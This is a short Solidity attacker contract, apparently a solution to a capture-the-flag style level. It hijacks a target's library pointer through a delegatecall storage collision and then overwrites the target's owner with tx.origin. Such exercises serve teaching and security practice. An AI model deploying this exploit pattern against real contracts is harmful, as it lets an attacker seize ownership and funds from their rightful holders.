// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IPreservation {
    function timeZone1Library() external view returns (address);
    function owner() external view returns (address);
    function setFirstTime(uint256 _timeStamp) external;
}

contract Preservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    IPreservation preservationInstance;

    constructor(address _instanceAddress) {
        preservationInstance = IPreservation(_instanceAddress);
    }

    function attack() external {
        preservationInstance.setFirstTime(uint256(uint160(address(this))));
        require(preservationInstance.timeZone1Library() == address(this), "First attack failed");
        preservationInstance.setFirstTime(1);
        require(preservationInstance.owner() == msg.sender, "Second attack failed");
    }

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }
}
